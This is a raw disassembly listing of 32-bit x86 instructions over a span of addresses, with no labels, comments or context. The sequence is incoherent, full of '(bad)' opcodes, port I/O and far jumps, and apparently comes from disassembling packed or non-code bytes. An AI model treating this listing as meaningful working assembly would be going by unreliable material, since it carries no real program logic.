  4220f9:	mov    edx,0xec6607bb
  4220fe:	mov    DWORD PTR [ebp+0x50],esp
  422101:	not    BYTE PTR [esi]
  422103:	push   esp
  422104:	int    0x13
  422106:	add    BYTE PTR gs:[ebp+0x4c],0xc5
  42210b:	(bad)  
  42210c:	xor    DWORD PTR [eax-0x16],eax
  42210f:	cmp    dl,BYTE PTR [ebx]
  422111:	sbb    esp,esi
  422113:	retf   
  422114:	clc    
  422115:	dec    edx
  422116:	mov    DWORD PTR [ecx+0x18],ebp
  422119:	es xchg ecx,eax
  42211b:	cld    
  42211c:	mov    ds:0x591163cc,al
  422121:	pop    ecx
  422122:	pop    edi
  422123:	jge    0x4220e2
  422125:	add    edx,DWORD PTR [eax]
  422127:	dec    eax
  422128:	sbb    esp,DWORD PTR [ebx]
  42212a:	xor    eax,0x22bdbf9f
  42212f:	dec    esp
  422130:	fwait
  422131:	pop    ecx
  422132:	in     eax,0xc
  422134:	int    0x54
  422136:	push   ebp
  422137:	inc    ebp
  422138:	adc    ebp,DWORD PTR [edi+0x65a9696a]
  42213e:	or     al,0x12
  422140:	mov    eax,0xf5a40cc5
  422145:	mov    ds:0x3fbb49e0,al
  42214a:	cmp    BYTE PTR [esp+ebx*1-0x49],cl
  42214e:	jb     0x422145
  422150:	jle    0x4220ef
  422152:	xchg   DWORD PTR [esp+edx*1+0x77],eax
  422156:	and    eax,0x8c28ada5
  42215b:	xchg   ecx,eax
  42215c:	mov    ah,0x47
  42215e:	xor    DWORD PTR [ebx],ebp
  422160:	adc    BYTE PTR [eax+0x4c1f175f],0x4
  422167:	add    ecx,esi
  422169:	xchg   esi,eax
  42216a:	cmp    DWORD PTR [ebp+edi*1-0x14],esi
  42216e:	in     eax,dx
  42216f:	push   ds
  422170:	test   al,0x26
  422172:	js     0x422137
  422174:	and    bh,BYTE PTR [esi+ebp*2-0x1e22428]
  42217b:	push   ss
  42217c:	loope  0x4221b9
  42217e:	mov    dl,0x35
  422180:	imul   ebp,ecx,0x65
  422183:	or     eax,0x21667f8
  422188:	mov    gs,WORD PTR [ebx]
  42218a:	sbb    ebx,DWORD PTR [esi-0x15c4c110]
  422190:	push   0xffffffdf
  422192:	xor    BYTE PTR [edx-0x36],bl
  422195:	jmp    0x422207
  422197:	sub    eax,0xb0bee5fa
  42219c:	ds test dl,dh
  42219f:	sub    al,0xc2
  4221a1:	test   DWORD PTR [ebx],edi
  4221a3:	frstor [esi+0x314ceea2]
  4221a9:	pop    ecx
  4221aa:	iret   
  4221ab:	mov    dl,0xe3
  4221ad:	les    ecx,FWORD PTR [esi-0x3]
  4221b0:	cmp    dl,BYTE PTR [esi]
  4221b2:	pop    edx
  4221b3:	sub    bh,BYTE PTR [eax+eiz*2]
  4221b6:	inc    edi
  4221b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221b8:	xchg   ebp,eax
  4221b9:	sub    al,0xc2
  4221bb:	pop    esi
  4221bc:	nop
  4221bd:	adc    ecx,eax
  4221bf:	nop
  4221c0:	or     edi,DWORD PTR [edi+0x7c7f7d94]
  4221c6:	xor    BYTE PTR [ecx+0x1bb09215],ah
  4221cc:	leave  
  4221cd:	push   esi
  4221ce:	dec    esp
  4221cf:	test   DWORD PTR [ebx-0x607e7d71],edi
  4221d5:	jbe    0x4221fd
  4221d7:	jns    0x422250
  4221d9:	mov    ebx,0x75c2c86d
  4221de:	iret   
  4221df:	lods   eax,DWORD PTR ds:[esi]
  4221e0:	sub    eax,0xeb1ca8b9
  4221e5:	icebp  
  4221e6:	jne    0x42218e
  4221e8:	lods   eax,DWORD PTR ds:[esi]
  4221e9:	aaa    
  4221ea:	pushf  
  4221eb:	out    dx,al
  4221ec:	jle    0x422172
  4221ee:	pop    ecx
  4221ef:	pop    ebx
  4221f0:	and    DWORD PTR [ebx-0x65911f16],ebx
  4221f6:	mov    esi,0x4cc99267
  4221fb:	call   0x7701:0xe6b01bd4
  422202:	test   eax,0xa199f0ae
  422207:	adc    BYTE PTR [edi-0x155f6866],dl
  42220d:	jno    0x4221b9
  42220f:	add    ebp,ebp
  422211:	pop    edi
  422212:	aam    0xef
  422214:	xlat   BYTE PTR ds:[ebx]
  422215:	mov    ds,WORD PTR [ebp+0x8]
  422218:	rol    DWORD PTR ds:0x3197ae44,cl
  42221e:	cmp    al,0x16
  422220:	jecxz  0x4221e5
  422222:	retf   0x98a1
  422225:	test   BYTE PTR [eax],0xfe
  422228:	lock (bad) 
  42222a:	fstp   QWORD PTR [edx]
  42222c:	jne    0x42225a
  42222e:	fwait
  42222f:	not    DWORD PTR [ecx+0x5498b2a8]
  422235:	loopne 0x42228b
  422237:	aad    0xce
  422239:	xor    eax,0xb8d398bb
  42223e:	xchg   esp,eax
  42223f:	mov    esp,0x5e54c7b4
  422244:	cmp    BYTE PTR [edi-0x59],0xcc
  422248:	in     al,0x1e
  42224a:	mov    al,ds:0xda7a2e9f
  42224f:	in     eax,0x7a
  422251:	push   esp
  422252:	add    al,0xcd
  422254:	loopne 0x42229d
  422256:	call   0xeacb6011
  42225b:	in     eax,dx
  42225c:	scas   eax,DWORD PTR es:[di]
  42225e:	retf   
  42225f:	xor    al,BYTE PTR [esi-0x61]
  422262:	mov    eax,0x2331fda2
  422267:	sub    dl,BYTE PTR [edx]
  422269:	ins    DWORD PTR es:[edi],dx
  42226a:	pop    ebp
  42226b:	imul   edx,DWORD PTR [ecx],0xb84a97b3
  422271:	sbb    BYTE PTR [edi+0x4540cb1e],al
  422277:	fucomp st(3)
  422279:	mov    al,0x19
  42227b:	sub    eax,0xa2f2153a
  422280:	rcl    DWORD PTR [edi-0x23179681],0xd
  422287:	out    0x6e,al
  422289:	aaa    
  42228a:	adc    BYTE PTR [ebx+0x1f],ch
  42228d:	pop    eax
  42228e:	or     cl,dh
  422290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422291:	or     DWORD PTR [ebp-0x2a],esp
  422294:	inc    edi
  422295:	jge    0x422287
  422297:	lea    ebx,[eax+0x74397abc]
  42229d:	scas   eax,DWORD PTR es:[edi]
  42229e:	or     eax,0x73db3ee0
  4222a3:	sub    ch,BYTE PTR [ebp-0x4ae9f2b8]
  4222a9:	mov    ch,0x85
  4222ab:	cmovno ecx,DWORD PTR [ebx]
  4222ae:	je     0x4222ce
  4222b0:	mov    bh,0x9c
  4222b2:	or     al,0x4b
  4222b4:	inc    eax
  4222b5:	popf   
  4222b6:	push   cs
  4222b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222b8:	fsub   st,st(0)
  4222ba:	inc    esi
  4222bb:	mov    edx,0xabb7458b
  4222c0:	sbb    eax,0x80d92f34
  4222c5:	(bad)  
  4222c7:	mov    ch,0x45
  4222c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222ca:	jnp    0x4222d3
  4222cc:	xor    esp,DWORD PTR [edx]
  4222ce:	aaa    
  4222cf:	pop    ecx
  4222d1:	inc    edx
  4222d2:	sbb    al,0x7
  4222d4:	bound  ecx,QWORD PTR [esi]
  4222d6:	push   esp
  4222d7:	fsub   DWORD PTR [edx]
  4222d9:	inc    esi
  4222da:	nop
  4222db:	mov    ch,0x61
  4222dd:	imul   ebp,DWORD PTR [eax+0x6eb5f827],0xffffff82
  4222e4:	les    esi,FWORD PTR [ecx-0xf]
  4222e7:	test   al,0x72
  4222e9:	xor    eax,0xa6366845
  4222ee:	push   esp
  4222ef:	dec    ebx
  4222f0:	inc    ecx
  4222f1:	pop    edi
  4222f2:	push   0x1540c1c5
  4222f7:	push   0xd0f4d490
  4222fc:	pop    ds
  4222fd:	add    BYTE PTR [edx-0x3d097f91],bl
  422303:	das    
  422304:	dec    edx
  422305:	xchg   edx,eax
  422306:	test   al,0x57
  422308:	sbb    DWORD PTR [esi+0x4f],ebp
  42230b:	jg     0x4222a9
  42230d:	or     eax,0x8b0aa6ba
  422312:	jp     0x4222f9
  422314:	adc    ah,BYTE PTR [edi+0x51620047]
  42231a:	inc    edx
  42231b:	sbb    al,0x9c
  42231d:	adc    BYTE PTR [eax-0x5d54c817],bl
  422323:	loop   0x422337
  422325:	jbe    0x4222df
  422327:	dec    esp
  422328:	cmp    edi,DWORD PTR [ebx-0xc9a0944]
  42232e:	and    cl,bl
  422330:	mov    bh,0x16
  422332:	push   esi
  422333:	repz aad 0x21
  422336:	aaa    
  422337:	(bad)  
  422338:	pop    ecx
  422339:	pop    esp
  42233a:	mov    bh,0x81
  42233c:	data16 int 0xc7
  42233f:	out    dx,al
  422340:	cwde   
  422341:	fild   QWORD PTR [eax-0x3e]
  422344:	cwde   
  422345:	outs   dx,DWORD PTR ds:[esi]
  422346:	popa   
  422347:	adc    DWORD PTR [edi-0x4a],esi
  42234a:	int3   
  42234b:	dec    edi
  42234c:	sbb    bh,BYTE PTR [edx+0x56b84f9b]
  422352:	mov    dh,0x51
  422354:	mov    ds:0x76e5f3b3,eax
  422359:	and    BYTE PTR ds:0x55ed6336,bl
  42235f:	out    dx,al
  422360:	mov    esp,0x6ba850cb
  422365:	cmp    ebx,DWORD PTR [esp+ecx*4+0x26240d9d]
  42236c:	pop    ebx
  42236d:	sbb    ecx,DWORD PTR [ebx]
  42236f:	rol    ch,0x6e
  422372:	dec    edx
  422373:	test   DWORD PTR [ecx+0x38],0xb8c11569
  42237a:	mov    ebp,0x1d6c0490
  42237f:	iret   
  422380:	sub    eax,0xc8be378c
  422385:	push   es
  422386:	ja     0x4223ce
  422388:	test   BYTE PTR ds:0x3016455d,bl
  42238e:	sub    bl,BYTE PTR [ebp+0x4f72eca9]
  422394:	mov    edi,0x3a9b35ab
  422399:	jmp    0xb8b3:0x130a72ba
  4223a0:	ja     0x422372
  4223a2:	sti    
  4223a3:	pop    esp
  4223a4:	adc    ecx,eax
  4223a6:	fcom   QWORD PTR [edi-0x5a274866]
  4223ac:	sbb    eax,0xad433249
  4223b1:	push   eax
  4223b2:	test   DWORD PTR [ecx],edx
  4223b4:	xchg   edi,eax
  4223b5:	sub    DWORD PTR [edx+0x47116e05],esi
  4223bb:	cli    
  4223bc:	sahf   
  4223bd:	test   eax,0xe2cd402
  4223c2:	add    DWORD PTR [ebx-0x18],edi
  4223c5:	leave  
  4223c6:	push   esp
  4223c7:	into   
  4223c8:	xchg   edi,eax
  4223c9:	xchg   esp,eax
  4223ca:	retf   
  4223cb:	retf   0x4698
  4223ce:	jae    0x422401
  4223d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d1:	or     eax,0x6c570b34
  4223d6:	pop    ss
  4223d7:	das    
  4223d8:	cld    
  4223d9:	ss push ecx
  4223db:	ins    BYTE PTR es:[edi],dx
  4223dc:	shl    DWORD PTR [edi+0x1f],0x68
  4223e0:	fs pop ebp
  4223e2:	std    
  4223e3:	adc    dh,BYTE PTR [ebp-0x5f4e0e20]
  4223e9:	popf   
  4223ea:	out    dx,al
  4223eb:	sbb    BYTE PTR [eax],bl
  4223ed:	outs   dx,DWORD PTR ds:[esi]
  4223ee:	out    dx,eax
  4223ef:	push   cs
  4223f0:	pop    ss
  4223f1:	pop    esp
  4223f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223f3:	dec    eax
  4223f4:	pop    esi
  4223f5:	xor    esp,ebp
  4223f7:	test   al,0x38
  4223f9:	mov    bh,0xb5
  4223fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fc:	mov    ah,0xdd
  4223fe:	mov    ds:0xae38f5f0,eax
  422403:	stos   BYTE PTR es:[edi],al
  422404:	jne    0x422474
  422406:	cli    
  422407:	push   0x4c97ec62
  42240c:	push   eax
  42240d:	mov    dh,0x66
  42240f:	or     DWORD PTR [edi],esp
  422411:	pusha  
  422412:	sbb    BYTE PTR [ebx-0x246c9fbb],al
  422418:	rol    BYTE PTR [esi-0x45],0x81
  42241c:	pop    esi
  42241d:	mov    eax,0x982e8182
  422422:	mov    edi,0xf0909812
  422427:	adc    DWORD PTR [eax-0x78],ebx
  42242a:	outs   dx,DWORD PTR ds:[esi]
  42242b:	xor    DWORD PTR [ebp-0x5e],esi
  42242e:	adc    ah,dh
  422430:	pop    es
  422431:	stos   BYTE PTR es:[edi],al
  422432:	push   ecx
  422433:	loop   0x4223fd
  422435:	sahf   
  422436:	push   esp
  422437:	ret    
  422438:	ja     0x422463
  42243a:	jne    0x4223f1
  42243c:	xor    al,0x65
  42243e:	ins    BYTE PTR es:[edi],dx
  42243f:	or     bl,BYTE PTR ds:0x6a49dbb0
  422445:	cmp    al,0x6c
  422447:	cs pop ebx
  422449:	dec    eax
  42244a:	inc    ecx
  42244b:	cld    
  42244c:	test   eax,0x9bfcfc36
  422451:	loopne 0x4224ac
  422453:	data16 mov bh,0xe4
  422456:	mov    bh,0x92
  422458:	rcr    DWORD PTR [esp+ebp*2-0x3],1
  42245c:	sub    eax,0x4bc119ce
  422461:	popa   
  422462:	mov    WORD PTR [esi],cs
  422464:	xchg   BYTE PTR [edx],dl
  422466:	mov    ds:0x934571fd,eax
  42246b:	mov    edi,0x6eac8a25
  422470:	fadd   st(6),st
  422472:	aaa    
  422473:	cmc    
  422474:	and    bh,0x73
  422477:	or     esp,ecx
  422479:	push   es
  42247a:	(bad)  
  42247b:	jmp    0xa4744ed5
  422480:	lods   al,BYTE PTR ds:[esi]
  422481:	ins    BYTE PTR es:[edi],dx
  422482:	stc    
  422483:	stc    
  422484:	je     0x422426
  422486:	xor    bl,bh
  422488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422489:	mov    edx,edx
  42248b:	xor    edi,DWORD PTR [esi]
  42248d:	cli    
  42248e:	iret   
  42248f:	sti    
  422490:	sub    BYTE PTR [edi-0x3e214ca7],0xc
  422497:	push   ss
  422498:	mov    eax,ds:0xf80e3cf8
  42249d:	jae    0x4224e2
  42249f:	push   ecx
  4224a0:	push   0xffffffec
  4224a2:	jb     0x422506
  4224a4:	cmp    DWORD PTR [eax],0x6c
  4224a7:	xchg   DWORD PTR [ecx+0x13d761c8],esi
  4224ad:	loopne 0x422480
  4224af:	dec    ebx
  4224b0:	inc    BYTE PTR [esp+edi*8-0x71]
  4224b4:	ss jb  0x4224ee
  4224b7:	xchg   esp,eax
  4224b8:	(bad)  
  4224ba:	jecxz  0x422491
  4224bc:	xchg   ebp,eax
  4224bd:	out    0xf1,eax
  4224bf:	lods   eax,DWORD PTR ds:[esi]
  4224c0:	sub    DWORD PTR [ecx+ebp*4],esp
  4224c3:	call   0x1e56f411
  4224c8:	push   ss
  4224c9:	cld    
  4224ca:	inc    esi
  4224cb:	xlat   BYTE PTR ds:[ebx]
  4224cc:	fadd   QWORD PTR ds:0x839c0604
  4224d2:	test   eax,0xabf30758
  4224d7:	push   0x58
  4224d9:	imul   ebp,DWORD PTR [eax],0x543fd0cb
  4224df:	sbb    eax,0x66f1b2f4
  4224e4:	mov    dl,0x28
  4224e6:	fs jp  0x4224e9
  4224e9:	jae    0x4224f2
  4224eb:	ficomp WORD PTR [edx]
  4224ed:	pusha  
  4224ee:	and    BYTE PTR [eax],al
  4224f0:	das    
  4224f1:	out    0xd8,eax
  4224f3:	int3   
  4224f4:	mov    eax,0x2028e022
  4224f9:	lea    ecx,[esi-0x53]
  4224fc:	lods   eax,DWORD PTR ds:[esi]
  4224fd:	fcmovb st,st(3)
  4224ff:	xor    BYTE PTR [ebp+0x67],ch
  422502:	dec    ecx
  422503:	sbb    DWORD PTR [esi],0xffffffe5
  422506:	sub    BYTE PTR ds:0xa55faf21,0xdc
  42250d:	call   edi
  42250f:	repz adc dh,BYTE PTR [eax]
  422512:	test   eax,0x14042e6a
  422517:	sub    ch,al
  422519:	jae    0x42253e
  42251b:	(bad)  
  42251c:	adc    ch,BYTE PTR [esi]
  42251e:	push   ebp
  42251f:	nop
  422520:	loopne 0x422515
  422522:	bsr    ecx,DWORD PTR [ecx]
  422525:	push   0x66
  422527:	adc    DWORD PTR [edx+0x67],0xffffff88
  42252b:	test   DWORD PTR [eax+0x0],0x35c912ba
  422532:	test   edi,esi
  422534:	jecxz  0x42257d
  422536:	adc    ah,BYTE PTR [esi-0x65]
  422539:	jbe    0x4225ab
  42253b:	mov    fs,WORD PTR [ebx-0x26]
  42253e:	mov    esp,DWORD PTR [eax-0x31]
  422541:	arpl   WORD PTR [ebx+0x6efeb291],di
  422547:	mov    cl,0xe9
  422549:	int    0x7c
  42254b:	xchg   ebx,eax
  42254c:	mov    eax,ds:0xc944a326
  422551:	popf   
  422552:	mov    cl,0xa7
  422554:	or     eax,0x9d07ba74
  422559:	cli    
  42255a:	out    0x2c,al
  42255c:	mov    DWORD PTR [ebx+0x6e],edi
  42255f:	shl    DWORD PTR [edi-0x27388ab7],1
  422565:	pusha  
  422566:	aad    0x16
  422568:	call   0xb378d13b
  42256d:	imul   DWORD PTR [edi-0x7dd96c9]
  422573:	xor    dl,ch
  422575:	sahf   
  422576:	fistp  QWORD PTR [ebx-0x67]
  422579:	mov    eax,0x732be9de
  42257e:	fimul  WORD PTR [esi]
  422580:	(bad)  
  422581:	cli    
  422582:	xor    al,0x73
  422584:	and    eax,0x73db378
  422589:	pusha  
  42258a:	xor    ebp,DWORD PTR [edx]
  42258c:	mov    ds:0x1c568d01,al
  422591:	push   ds
  422592:	mov    cl,0x59
  422594:	push   ebx
  422595:	mov    eax,ds:0x70c990b2
  42259a:	cmova  ecx,ebx
  42259d:	jp     0x4225f2
  42259f:	mov    esi,0x948790dd
  4225a4:	mov    ds:0xcb4205bb,al
  4225a9:	cmp    eax,0x7baedfc7
  4225ae:	call   0xe8b7:0x52eab065
  4225b5:	xchg   edx,eax
  4225b6:	aam    0xaa
  4225b8:	fst    DWORD PTR [edi-0x18]
  4225bb:	mov    esp,0x5cd0d70d
  4225c0:	icebp  
  4225c1:	or     ecx,esp
  4225c3:	popa   
  4225c4:	(bad)  
  4225c5:	(bad)  
  4225c6:	cmp    BYTE PTR [edx-0x49c93bbb],cl
  4225cc:	lods   al,BYTE PTR ds:[esi]
  4225cd:	inc    eax
  4225ce:	cmp    al,0xc5
  4225d0:	adc    esp,esp
  4225d2:	scas   al,BYTE PTR es:[edi]
  4225d3:	fdivr  st,st(0)
  4225d5:	aas    
  4225d6:	xchg   esi,eax
  4225d7:	mov    eax,ds:0x2571a424
  4225dc:	mov    ds:0x4e253c2,al
  4225e1:	mov    bh,BYTE PTR [esi-0x56]
  4225e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225e5:	pushf  
  4225e6:	test   dl,ch
  4225e8:	imul   esp,DWORD PTR [eax-0x41],0x1c
  4225ec:	sbb    al,0x8b
  4225ee:	repnz xacquire xchg DWORD PTR ds:0x86f7130c,esi
  4225f6:	(bad)  
  4225f7:	stc    
  4225f8:	sub    BYTE PTR [esi-0x4cfcf1f4],dh
  4225fe:	adc    bl,dl
  422600:	mov    ah,0x9f
  422602:	inc    eax
  422603:	xor    eax,0x1532efdb
  422608:	jmp    0x42262e
  42260a:	push   eax
  42260b:	jge    0x42265b
  42260d:	test   eax,0x254e7866
  422612:	sbb    ebp,DWORD PTR [ebx]
  422614:	out    0xfc,al
  422616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422617:	inc    ebx
  422618:	fwait
  422619:	add    ebp,0x80158019
  42261f:	mov    edx,0x907d2288
  422624:	pushf  
  422625:	xor    eax,0xce79297c
  42262a:	or     esi,eax
  42262c:	js     0x422660
  42262e:	in     eax,0xa6
  422630:	push   esi
  422631:	and    DWORD PTR [ebx],ebp
  422633:	sub    al,0xec
  422635:	cs std 
  422637:	imul   edi,DWORD PTR [ebx],0xffffffb3
  42263a:	cdq    
  42263b:	mov    esi,ecx
  42263d:	pop    ebx
  42263e:	fs cld 
  422640:	les    ebp,FWORD PTR [ebx+0xb52ab1c]
  422646:	inc    ecx
  422647:	and    esp,esp
  422649:	mov    bh,0x2b
  42264b:	sub    eax,0xfee0c097
  422650:	sar    DWORD PTR [edi],1
  422652:	or     al,0x47
  422654:	aad    0xcb
  422656:	push   ecx
  422657:	cmp    eax,0xd76ed0ce
  42265c:	and    ebx,DWORD PTR [edi+esi*1+0x4127aa55]
  422663:	mov    edi,0xcaf50476
  422668:	jne    0x422621
  42266a:	jmp    0x422602
  42266c:	mov    ds,WORD PTR [edx+0x1f862d26]
  422672:	cmc    
  422673:	mov    BYTE PTR [edx+edx*8],cl
  422676:	or     ecx,esi
  422678:	mov    BYTE PTR [ecx],ah
  42267a:	sub    ah,ah
  42267c:	adc    DWORD PTR [eax-0x7f],edx
  42267f:	mov    al,BYTE PTR [ecx+eax*1-0x7b5f5a9d]
  422686:	in     al,dx
  422687:	adc    bl,BYTE PTR [edx]
  422689:	outs   dx,BYTE PTR ds:[esi]
  42268a:	std    
  42268b:	jns    0x4226c6
  42268d:	xor    ebx,DWORD PTR [ebp+0x30]
  422690:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  422692:	mov    ?,esi
  422694:	inc    ebp
  422695:	data16 aam 0xb0
  422698:	stos   BYTE PTR es:[edi],al
  422699:	or     al,0x2e
  42269b:	inc    edi
  42269c:	aam    0xc3
  42269e:	sbb    eax,0xd4fe727
  4226a3:	mov    cl,0xc0
  4226a5:	ret    0x1a19
  4226a8:	aaa    
  4226a9:	mov    DWORD PTR [ecx+ecx*2+0x64e2196d],eax
  4226b0:	jae    0x422685
  4226b2:	das    
  4226b3:	push   ebp
  4226b4:	push   edx
  4226b6:	clc    
  4226b7:	mov    ebx,0x8addb9f4
  4226bc:	sub    dh,BYTE PTR [ebx-0x4c1fc438]
  4226c2:	mov    esp,esp
  4226c4:	lahf   
  4226c5:	adc    ah,BYTE PTR [ebx-0x320ad7b4]
  4226cb:	xchg   ebp,eax
  4226cc:	fimul  WORD PTR ds:0xff93a2f0
  4226d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226d3:	or     al,0x4f
  4226d5:	gs or  cl,0x56
  4226d9:	push   ecx
  4226da:	aas    
  4226db:	cs xchg ebp,eax
  4226dd:	pop    es
  4226de:	dec    ebp
  4226df:	inc    ebx
  4226e0:	outs   dx,DWORD PTR ds:[esi]
  4226e1:	push   ebx
  4226e2:	stc    
  4226e3:	loop   0x422704
  4226e5:	sahf   
  4226e6:	gs or  bl,dl
  4226e9:	cmc    
  4226ea:	out    0x76,eax
  4226ec:	dec    edx
  4226ed:	ror    BYTE PTR [eax+0x5b6dc448],cl
  4226f3:	sbb    eax,0x14bc2c13
  4226f8:	(bad)  [ebx]
  4226fa:	js     0x422692
  4226fc:	push   ebx
  4226fd:	sbb    eax,0xe0066c63
  422702:	dec    esp
  422703:	mov    al,0xda
  422705:	aas    
  422706:	inc    ebp
  422707:	popa   
  422708:	fimul  WORD PTR [edi-0x22]
  42270b:	arpl   sp,sp
  42270d:	inc    ebx
  42270e:	or     edi,edx
  422710:	xor    edx,DWORD PTR [edi]
  422712:	or     DWORD PTR [eax+0x3e],esp
  422715:	and    BYTE PTR cs:[esi],dl
  422718:	iret   
  422719:	enter  0xe634,0x92
  42271d:	sahf   
  42271e:	xchg   BYTE PTR [ecx],ch
  422720:	stos   DWORD PTR es:[edi],eax
  422721:	bound  eax,QWORD PTR [ebp+ebp*4-0x65]
  422725:	out    0x45,al
  422727:	adc    bl,BYTE PTR [edx-0xbc190e5]
  42272d:	out    0xf4,al
  42272f:	aad    0xb3
  422731:	das    
  422732:	ins    DWORD PTR es:[edi],dx
  422733:	in     al,0x6c
  422735:	cwde   
  422736:	fadd   QWORD PTR [ebx+0x6d802755]
  42273c:	or     ah,BYTE PTR [edi+0x3b]
  42273f:	repnz fwait
  422741:	popf   
  422742:	fs loope 0x42273a
  422745:	pop    es
  422746:	push   eax
  422747:	jbe    0x422749
  422749:	jle    0x4226fb
  42274b:	mov    edi,0x5fd6a6f7
  422750:	dec    esi
  422751:	imul   esi,DWORD PTR [eax],0xa50485ce
  422757:	int    0x6e
  422759:	loope  0x42275f
  42275b:	or     BYTE PTR [eax],al
  42275d:	mov    ch,0xcd
  42275f:	mov    dh,0x60
  422761:	test   BYTE PTR [edx+0x4ddda3d9],ch
  422767:	test   al,0x39
  422769:	imul   ebx,DWORD PTR [ecx+0x2c],0x5e
  42276d:	adc    eax,0x3dd88fc2
  422772:	mov    bh,0xb
  422774:	dec    edi
  422775:	push   ss
  422776:	and    BYTE PTR [edi-0x53],ah
  422779:	pop    ds
  42277a:	push   0xb218661b
  42277f:	ss into 
  422781:	ret    
  422782:	adc    bh,dh
  422784:	mov    dh,0x53
  422786:	mov    DWORD PTR ds:0xa04dfb2,esp
  42278c:	imul   esp,DWORD PTR [edx-0x10],0x803ef0c0
  422793:	adc    DWORD PTR [edx+0x60],edx
  422796:	add    DWORD PTR [ecx+0x66],eax
  422799:	jmp    DWORD PTR [edi]
  42279b:	jno    0x422752
  42279d:	push   ss
  42279e:	push   0xfffffff0
  4227a0:	xor    BYTE PTR [ecx+0x5a],ch
  4227a3:	mov    ebp,0xa9ab132d
  4227a8:	push   0x5f
  4227aa:	mov    bh,BYTE PTR [eax-0x2]
  4227ad:	ror    DWORD PTR [ecx-0x3a],0xe7
  4227b1:	dec    ebx
  4227b2:	jmp    0xd0b992e4
  4227b7:	mov    ?,esp
  4227b9:	jo     0x422833
  4227bb:	adc    BYTE PTR [esi],0xad
  4227be:	mov    dh,BYTE PTR [eax+ebx*4+0x66269684]
  4227c5:	sub    eax,0x49054d23
  4227ca:	jne    0x422756
  4227cc:	cmp    DWORD PTR [eax-0x384e16dc],eax
  4227d2:	mov    ds:0xf60ccf0e,al
  4227d7:	sti    
  4227d8:	jp     0x4227a8
  4227da:	cmp    al,0xa7
  4227dc:	mov    edi,0x475623e6
  4227e1:	js     0x42284c
  4227e3:	cmp    DWORD PTR [edx+0x3e],edi
  4227e6:	adc    eax,DWORD PTR [ecx+0x2c]
  4227e9:	mov    al,ds:0x8ba5f51
  4227ee:	gs mov ah,0x18
  4227f1:	in     al,0x5e
  4227f3:	sub    al,0x6a
  4227f5:	popf   
  4227f6:	pop    esi
  4227f7:	je     0x422784
  4227f9:	xor    DWORD PTR [edx+0x5fb44663],ebx
  4227ff:	clc    
  422800:	daa    
  422801:	pop    es
  422802:	scas   al,BYTE PTR es:[edi]
  422803:	es xor eax,0xace2a67b
  422809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42280a:	push   ds
  42280b:	mov    esp,0xdba41ec8
  422810:	ins    DWORD PTR es:[edi],dx
  422811:	jmp    0x422871
  422813:	in     eax,0x8a
  422815:	adc    ecx,DWORD PTR [edx-0x5d]
  422818:	mov    ds,WORD PTR [ecx]
  42281a:	or     BYTE PTR [eax],cl
  42281c:	jb     0x422893
  42281e:	lea    esp,[ebx+0x12]
  422821:	push   esp
  422822:	aad    0xc2
  422824:	jnp    0x422800
  422826:	mov    esp,0x6463b2d5
  42282b:	data16 jge 0x422820
  42282e:	stos   BYTE PTR es:[edi],al
  42282f:	outs   dx,DWORD PTR ds:[esi]
  422830:	cmp    ecx,DWORD PTR [ecx]
  422832:	or     al,BYTE PTR [ecx+0x5e07a7c5]
  422838:	cld    
  422839:	pusha  
  42283a:	das    
  42283b:	rol    BYTE PTR [ebx-0x4e],1
  42283e:	sbb    DWORD PTR es:[edx+0x32abb8a1],eax
  422845:	pop    edx
  422846:	sub    eax,0xc3e855ba
  42284b:	icebp  
  42284c:	(bad)  
  42284d:	scas   al,BYTE PTR es:[edi]
  42284e:	inc    eax
  42284f:	push   edx
  422850:	imul   edi,DWORD PTR [ecx+0x40],0xbed81da4
  422857:	pop    ecx
  422858:	xor    eax,0x7da5658e
  42285d:	je     0x4227ea
  42285f:	sahf   
  422860:	in     eax,0xc3
  422862:	leave  
  422863:	enter  0xa81c,0xb8
  422867:	test   al,0xf9
  422869:	push   edx
  42286a:	fldcw  WORD PTR [ebp-0x5270f010]
  422870:	adc    al,0x9d
  422872:	cwde   
  422873:	sbb    al,cl
  422875:	jmp    0xf5e9:0xfefa8885
  42287c:	sbb    dh,BYTE PTR [ebp+0x2af7e4f8]
  422882:	into   
  422883:	jp     0x422889
  422885:	push   eax
  422886:	jne    0x422867
  422888:	xchg   BYTE PTR [ebx-0x5e],ch
  42288b:	mov    bh,0xa4
  42288d:	mov    DWORD PTR [esi-0x6c15a343],eax
  422893:	bound  ebx,QWORD PTR [ecx+0x6e]
  422896:	inc    esp
  422897:	scas   al,BYTE PTR es:[edi]
  422898:	push   eax
  422899:	aam    0xc1
  42289b:	and    BYTE PTR [edx-0x630e85a4],0xee
  4228a2:	and    eax,0xd3061d27
  4228a7:	push   es
  4228a8:	mov    cl,0xb6
  4228aa:	pop    ds
  4228ab:	lods   al,BYTE PTR ds:[esi]
  4228ac:	adc    eax,DWORD PTR [edx]
  4228ae:	test   dl,ch
  4228b0:	je     0x422882
  4228b2:	mov    DWORD PTR [edi+ebx*1+0x184f71d8],edx
  4228b9:	in     eax,0x8e
  4228bb:	push   ebx
  4228bc:	pop    edx
  4228bd:	jl     0x4228a9
  4228bf:	and    ah,0x5f
  4228c2:	adc    al,0x67
  4228c4:	not    bl
  4228c6:	xchg   DWORD PTR [bp+di-0x3a56],ebx
  4228cb:	enter  0x7bab,0xf6
  4228cf:	loopne 0x422925
  4228d1:	retf   0x20f5
  4228d4:	inc    ebx
  4228d5:	pop    es
  4228d6:	xor    ebx,0x5323624e
  4228dc:	xchg   ecx,eax
  4228dd:	jg     0x4228cb
  4228df:	mov    eax,eax
  4228e1:	mov    cl,0x5a
  4228e3:	and    edi,ecx
  4228e5:	adc    eax,0x4a295ed2
  4228ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
